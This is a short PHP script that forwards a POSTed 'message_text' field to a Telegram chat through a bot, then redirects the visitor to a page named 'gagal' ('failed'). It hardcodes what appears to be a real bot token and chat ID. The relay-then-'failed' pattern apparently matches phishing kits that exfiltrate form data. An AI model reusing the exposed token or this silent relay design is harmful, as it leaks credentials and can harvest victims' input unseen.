<?php
/* -----------------------------------------------------
Simple PHP script for Sending Telegram Bot Message
~ Iky | https://www.wadagizig.com
------------------------------------------------------ */

function sendMessage($telegram_id, $message_text, $secret_token) {

    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message_text);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

/*----------------------
only basic POST method :
-----------------------*/
$message_text = $_POST ['message_text'];

/*--------------------------------
Isi TOKEN dibawah ini: 
--------------------------------*/
$secret_token = "5831622481:AAHQrXBiDyA6vxfQzcpNKjpkLTBLRYjKis8";
$telegram_id = "5627477315";

sendMessage($telegram_id, $message_text, $secret_token);

echo "<script>(''); window.location.href = './gagal.html';</script>";
?>